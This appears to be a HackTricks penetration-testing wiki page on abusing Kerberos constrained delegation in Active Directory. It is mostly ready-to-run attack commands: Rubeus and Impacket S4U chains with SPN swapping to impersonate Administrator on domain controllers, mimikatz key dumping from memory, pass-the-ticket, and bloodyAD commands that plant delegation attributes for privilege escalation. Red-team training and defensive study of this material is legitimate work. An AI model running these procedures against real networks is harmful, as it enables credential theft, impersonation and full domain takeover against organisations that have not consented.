# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.

- **Service for User to self (_S4U2self_):** Any **service account that owns an SPN** can usually obtain a TGS to itself on behalf of an arbitrary user. If the account also has [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_, that TGS is **forwardable**, which is what makes protocol transition directly useful for **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** A **service account** can obtain a TGS on behalf of a user to the SPNs listed in **msDS-AllowedToDelegateTo**. The evidence ticket used in S4U2Proxy must be a **forwardable** ticket to the delegating service: either a real client-to-service ticket captured from the victim or one generated with **S4U2Self + T2A4D**.

**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_’ in AD, or is a member of **Protected Users**, you will usually **not be able to impersonate** them through constrained delegation. In modern domains, prefer **AES** material over RC4-only assumptions when targeting delegation-enabled accounts.

This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to any **service** over the indicated machines (possible **privesc**).

Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked (in the ticket this part is not encrypted/signed). Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus for example. The same SPN swapping weakness is abused by **Impacket getST -altservice** and other tooling.

Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Operator note:** don't trust **ADUC** or BloodHound screenshots alone for **gMSA/sMSA** review. Those accounts often hide the usual Delegation tab, so enumerate the raw **`userAccountControl`** and **`msDS-AllowedToDelegateTo`** attributes directly.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-transition vs Kerberos-only constrained delegation

If the compromised account has **T2A4D**, you can usually complete the full **`S4U2Self -> S4U2Proxy`** chain from only the service key/TGT.

If it only has **`msDS-AllowedToDelegateTo`** (the classic **"Use Kerberos only"** mode), the delegation can still be abusable, but the evidence ticket for S4U2Proxy must be a **real forwardable user-to-service ticket** for the delegating service. In practice that means stealing or capturing a victim TGS from **LSASS/ccache** and feeding it into the second stage (`/tgs:` in Rubeus). A **non-forwardable** S4U2Self ticket is **not** enough for classic constrained delegation; if that is your only evidence ticket, check [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) instead.

### Cross-domain constrained delegation notes (2025+)

Since **Windows Server 2012/2012 R2** the KDC supports **constrained delegation across domains/forests** via S4U2Proxy extensions. Modern builds (Windows Server 2016–2025) keep this behaviour and add two PAC SIDs to signal protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) when the user authenticated normally.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) when a service asserted the identity through protocol transition.

Expect `SERVICE_ASSERTED_IDENTITY` inside the PAC when protocol transition is used across domains, confirming the S4U2Proxy step succeeded.

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) exposes the same S4U chain and SPN swapping as Rubeus:

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. `tgssub.py` is also handy when you already have a working ccache and only need to swap the service class for the same host. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).

### Automating delegation setup from low-priv creds

If you already hold **GenericAll/WriteDACL** over a computer or service account, you can push the required attributes remotely without RSAT using **bloodyAD** (2024+):

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

This lets you build a constrained delegation path for privesc without DA privileges as soon as you can write those attributes.

- Step 1: **Get TGT of the allowed service**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory Certificate Service abuse
>
> **Just having that TGT ticket (or hashed) you can perform this attack without compromising the whole computer.**

- Step2: **Get TGS for the service impersonating the user**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## References
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Abusing Delegation with Impacket (Part 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)

{{#include ../../banners/hacktricks-training.md}}
